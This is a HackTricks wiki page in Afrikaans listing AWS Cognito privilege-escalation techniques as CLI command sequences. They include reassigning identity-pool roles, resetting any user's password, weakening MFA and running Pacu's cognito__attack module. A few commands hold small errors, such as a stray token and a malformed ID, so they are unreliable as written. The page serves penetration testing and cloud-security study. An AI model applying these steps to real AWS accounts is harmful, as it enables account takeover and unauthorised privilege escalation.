# AWS - Cognito Voorregverhoging

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Cognito

Vir meer inligting oor Cognito, kyk:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Versameling van geloofsbriewe van Identiteitspoel

Aangesien Cognito **IAM rol geloofsbriewe** aan beide **ge√Ødentifiseerde** en **onge√Ødentifiseerde** **gebruikers** kan verleen, as jy die **Identiteitspoel-ID** van 'n aansoek opspoor (wat waarskynlik daarin vasgel√™ is), kan jy nuwe geloofsbriewe verkry en dus voorregverhoging (binne 'n AWS-rekening waar jy waarskynlik nie voorheen enige geloofsbriewe gehad het nie).

Vir meer inligting [**kyk na hierdie bladsy**](../aws-unauthenticated-enum-access/#cognito).

**Potensi√´le Impak:** Direkte voorregverhoging na die diensterol wat aan onge√Ødentifiseerde gebruikers geheg is (en waarskynlik ook aan di√© wat aan ge√Ødentifiseerde gebruikers geheg is).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Met hierdie toestemming kan jy **enige cognito rol** aan die ge√Ødentifiseerde/onge√Ødentifiseerde gebruikers van die cognito-aansoek toeken.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Indien die cognito-toep **nie ongeverifieerde gebruikers geaktiveer het nie**, mag jy ook die toestemming `cognito-identity:UpdateIdentityPool` benodig om dit te aktiveer.

**Potensi√´le Impak:** Direkte privesc na enige cognito rol.

### `cognito-identity:update-identity-pool`

'n Aanvaller met hierdie toestemming kan byvoorbeeld 'n Cognito-gebruikerstoep onder sy beheer instel of enige ander identiteitsverskaffer waar hy kan aanmeld as 'n **manier om toegang tot hierdie Cognito Identiteitspoel** te verkry. Dan sal net **aanmeld** by daardie gebruikersverskaffer hom toelaat om toegang tot die gekonfigureerde geauthentiseerde rol in die Identiteitspoel te verkry.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Dit is ook moontlik om **hierdie toestemming te misbruik om basiese outentifikasie toe te laat**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potensi√´le Impak**: Kompromitteer die gekonfigureerde geauthentiseerde IAM rol binne die identiteitspoel.

### `cognito-idp:AdminAddUserToGroup`

Hierdie toestemming maak dit moontlik om **'n Cognito-gebruiker by 'n Cognito-groep te voeg**, dus kan 'n aanvaller hierdie toestemming misbruik om 'n gebruiker onder sy beheer by ander groepe met **betere** voorregte of **verskillende IAM-rolle** toe te voeg:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potensi√´le Impak:** Privesc na ander Cognito-groepe en IAM-rolle wat aan Gebruikerspoelgroepe geheg is.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

'n Aanvaller met hierdie regte kan **groepe skep/bywerk** met **elke IAM-rol wat deur 'n gekompromitteerde Cognito Identiteitsverskaffer gebruik kan word** en 'n gekompromitteerde gebruiker deel van die groep maak, wat toegang tot al daardie rolle gee:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potensi√´le Impak:** Privesc na ander Cognito IAM-rolle.

### `cognito-idp:AdminConfirmSignUp`

Hierdie toestemming maak dit moontlik om **'n aanmelding te bevestig**. Standaard kan enigiemand aanmeld by Cognito-toepassings, as dit agtergelaat word, kan 'n gebruiker 'n rekening skep met enige data en dit bevestig met hierdie toestemming.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potensi√´le Impak:** Indirekte privilige-escalation na die identiteitspoel IAM rol vir geauthentiseerde gebruikers as jy 'n nuwe gebruiker kan registreer. Indirekte privilige-escalation na ander app-funksies deur enige rekening te kan bevestig.

### `cognito-idp:AdminCreateUser`

Hierdie toestemming sou 'n aanvaller in staat stel om 'n nuwe gebruiker binne die gebruikerspoel te skep. Die nuwe gebruiker word geskep as geaktiveer, maar sal sy wagwoord moet verander.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potensi√´le Impak:** Direkte privesc na die identiteitspoel IAM rol vir geauthentiseerde gebruikers. Indirekte privesc na ander app-funksies deur die vermo√´ om enige gebruiker te skep

### `cognito-idp:AdminEnableUser`

Hierdie toestemmings kan help in 'n baie uitsonderlike scenario waar 'n aanvaller die geloofsbriewe van 'n uitgeskakelde gebruiker gevind het en hy dit weer moet **aktiveer**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potensi√´le Impak:** Indirekte privesc na die identiteitspoel IAM rol vir geauthentiseerde gebruikers en toestemmings van die gebruiker as die aanvaller geloofsbriewe vir 'n gedeaktiveerde gebruiker gehad het.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Hierdie toestemming maak dit moontlik om in te teken met die [**metode ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Vir meer inligting volg die skakel.

### `cognito-idp:AdminSetUserPassword`

Hierdie toestemming sal 'n aanvaller toelaat om die wagwoord van enige gebruiker te verander, wat hom in staat stel om enige gebruiker te impersoneer (wat nie MFA geaktiveer het nie).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potensi√´le Impak:** Direkte privesc na moontlik enige gebruiker, dus toegang tot al die groepe waarvan elke gebruiker 'n lid is en toegang tot die Ge√Ødentifiseerde Poel geauthentiseerde IAM rol.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: 'n Aanvaller kan moontlik hierdie toestemming misbruik om 'n selfoon onder sy beheer as **SMS MFA van 'n gebruiker** in te stel.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Soortgelyk aan die vorige een kan hierdie toestemming gebruik word om die MFA-voorkeure van 'n gebruiker in te stel om die MFA-beskerming te omseil.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Soortgelyk aan die vorige een kan hierdie toestemming gebruik word om die MFA-voorkeure van 'n gebruikersgroep in te stel om die MFA-beskerming te omseil.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Dit is ook moontlik om die gebruikersgroep op te dateer om die MFA-beleid te verander. [Kyk cli hier](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potensi√´le Impak:** Indirekte bevoorregte toegang tot moontlik enige gebruiker waarvan die aanvaller die geloofsbriewe weet, dit kan die omseiling van die MFA-beskerming moontlik maak.

### `cognito-idp:AdminUpdateUserAttributes`

'n Aanvaller met hierdie toestemming kan die e-pos of telefoonnommer of enige ander attribuut van 'n gebruiker onder sy beheer verander om te probeer om meer voorregte in 'n onderliggende toepassing te verkry.\
Dit maak dit moontlik om 'n e-pos of telefoonnommer te verander en dit as geverifieer in te stel.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potensi√´le Impak:** Potensi√´le indirekte privesc in die onderliggende toepassing wat Cognito-gebruikerspoel gebruik wat voorregte gee op grond van gebruikerskenmerke.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

'n Aanvaller met hierdie toestemming kan **'n nuwe Gebruikerspoelklient minder beperk** as reeds bestaande poelkliente skep. Byvoorbeeld, die nuwe klient kan enige soort metode toelaat om te verifieer, geen geheim h√™, tokenherroeping gedeaktiveer h√™, toelaat dat tokens vir 'n langer tydperk geldig is...

Dieselfde kan gedoen word as in plaas van om 'n nuwe klient te skep, 'n **bestaande een gewysig word**.

In die [**opdraglyn**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (of die [**opdateer een**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) kan jy al die opsies sien, kyk daarna!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potensi√´le Impak:** Potensi√´le indirekte privesc na die Identiteit Pool gemagtigde gebruiker wat deur die Gebruiker Pool gebruik word deur 'n nuwe klient te skep wat die sekuriteitsmaatre√´ls verslap en dit moontlik maak vir 'n aanvaller om in te teken met 'n gebruiker wat hy kon skep.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

'n Aanvaller kan hierdie toestemming misbruik om gebruikers te skep deur 'n csv met nuwe gebruikers te laai.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(In die geval waar jy 'n nuwe invoerwerk skep, mag jy ook die iam passrole-toestemming benodig, ek het dit nog nie getoets nie).

**Potensi√´le Impak:** Direkte privesc na die identiteitspoel IAM rol vir ge√Ødentifiseerde gebruikers. Indirekte privesc na ander app-funksies wat in staat is om enige gebruiker te skep.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

'n Aanvaller kan 'n nuwe identiteitsverskaffer skep om dan in staat te wees om **deur hierdie verskaffer in te teken**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potensi√´le Impak:** Direkte privesc na die identiteitspoel IAM-rolo vir geauthentiseerde gebruikers. Indirekte privesc na ander app-funksies wat in staat is om enige gebruiker te skep.

### cognito-sync:\* Analise

Dit is 'n baie algemene toestemming wat standaard in rolle van Cognito Identiteitspoelen voorkom. Selfs al lyk 'n wildkaart in toestemmings altyd sleg (veral as dit van AWS af kom), is die **gegee toestemmings nie baie nuttig vanuit 'n aanvaller se perspektief nie**.

Hierdie toestemming maak dit moontlik om gebruikersinligting van Identiteitspoelen en Identiteits-ID's binne Identiteitspoelen te lees (wat nie sensitiewe inligting is nie).\
Identiteits-ID's kan [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) aan hulle toegewys h√™, wat inligting van die sessies is (AWS definieer dit soos 'n **gestoorde spel**). Dit is moontlik dat hierdie inligting enige soort sensitiewe inligting kan bevat (maar die waarskynlikheid is baie laag). Jy kan op die [**opsommingbladsy**](../aws-services/aws-cognito-enum/) vind hoe om toegang tot hierdie inligting te verkry.

'n Aanvaller kan ook hierdie toestemmings gebruik om homself te **inskryf vir 'n Cognito-stroom wat veranderinge publiseer** oor hierdie datasets of 'n **lambda wat op cognito-gebeure trigger**. Ek het nog nie gesien dat dit gebruik word nie, en ek sou nie verwag dat daar sensitiewe inligting hier sou wees nie, maar dit is nie onmoontlik nie.

### Outomatiese Gereedskap

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), die AWS-uitbuitingsraamwerk, sluit nou die "cognito\_\_enum" en "cognito\_\_attack" modules in wat outomatiese opsomming van alle Cognito-bates in 'n rekening en swak konfigurasies, gebruikerskenmerke wat vir toegangsbeheer gebruik word, ens., en ook outomatiese gebruikerskepping (insluitend MFA-ondersteuning) en privilegie-escalatie gebaseer op aanpasbare gebruikerskenmerke, bruikbare identiteitspoelgelde, aanneembare rolle in id-tokens, ens., outomatiseer.

Vir 'n beskrywing van die modules se funksies, sien deel 2 van die [blogpos](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Vir installeringinstruksies, sien die hoof [Pacu](https://github.com/RhinoSecurityLabs/pacu)-bladsy.

#### Gebruik

Voorbeeld cognito\_\_attack-gebruik om gebruikerskepping te probeer en alle privesc-vektore teen 'n gegewe identiteitspoel en gebruikerspoelklient:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Voorbeeld van cognito\_\_enum gebruik om alle gebruikerspoelen, gebruikerspoelkli√´nte, identiteitspoelen, gebruikers, ens. te versamel wat sigbaar is in die huidige AWS-rekening:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) is 'n CLI-werktuig in Python wat verskillende aanvalle op Cognito implementeer, insluitende 'n privesc-escalation.

#### Installasie
```bash
$ pip install cognito-scanner
```
#### Gebruik
```bash
$ cognito-scanner --help
```
Vir meer inligting, kyk na [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Leer & oefen AWS Hack: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
